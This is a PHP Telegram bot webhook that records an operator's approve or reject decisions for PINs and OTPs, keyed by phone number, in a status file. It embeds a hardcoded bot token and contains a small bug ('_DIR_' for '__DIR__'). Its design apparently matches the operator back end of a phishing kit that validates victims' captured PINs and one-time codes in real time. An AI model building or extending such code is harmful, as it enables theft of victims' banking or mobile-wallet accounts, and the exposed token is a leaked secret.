<?php
$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";
$update = json_decode(file_get_contents('php://input'), true);

if(isset($update['callback_query'])){
    $callback = $update['callback_query'];
    $data = $callback['data']; // approve_pin_0712345678
    $chatId = $callback['message']['chat']['id'];
    $messageId = $callback['message']['message_id'];
    $callbackId = $callback['id'];

    $parts = explode('_', $data);
    if(count($parts) < 3) return;

    $action = $parts[0]; // approve/reject
    $type   = $parts[1]; // pin/otp
    $phone  = $parts[2]; // phone number

    // ====== Write status to file ======
    $file = _DIR_ . "/status.json";
    $statuses = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    $statuses[$phone][$type] = $action;
    file_put_contents($file, json_encode($statuses));

    // Edit Telegram message
    $text = ($action == 'approve') ? "✅ " . strtoupper($type) . " Approved" : "❌ " . strtoupper($type) . " Rejected";
    $text = urlencode($text);
    file_get_contents("https://api.telegram.org/bot$token/editMessageText?chat_id=$chatId&message_id=$messageId&text=$text");

    // Answer callback so Telegram knows button worked
    file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callbackId&text=Action recorded&show_alert=false");

    exit();
}
?>